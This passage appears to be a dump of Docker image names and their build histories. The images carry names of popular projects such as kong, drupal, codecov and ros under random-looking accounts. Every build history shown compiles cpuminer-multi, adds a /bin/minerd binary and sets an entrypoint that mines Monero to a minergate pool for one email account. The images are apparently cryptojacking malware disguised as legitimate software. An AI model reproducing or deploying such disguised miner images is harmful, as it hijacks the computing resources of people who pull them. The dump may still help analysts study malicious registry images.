Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:6086fe1466d461e3d763ca57e1e45bd5c35d1a87a8b1a7ca6b9085c795c13dd6 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
datejicakzhorachucom/kong; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
gzprcetpasscom/aeros; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
clsksiskdiweycf/fluent; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
fyafarfurmailtk2/bonita; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
qcprtvchdcom/fsharp; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
hgrspslescom/kopf; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
gyamailtempmhatk/hylang; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
hnmrtvchdcom/ros; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
gozejovasaverdovcom/portus; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:6086fe1466d461e3d763ca57e1e45bd5c35d1a87a8b1a7ca6b9085c795c13dd6 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
eiprtvchdcom/drupal; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
odprcutoutclub/foopipes; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
ixqswierietk2/codecov; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
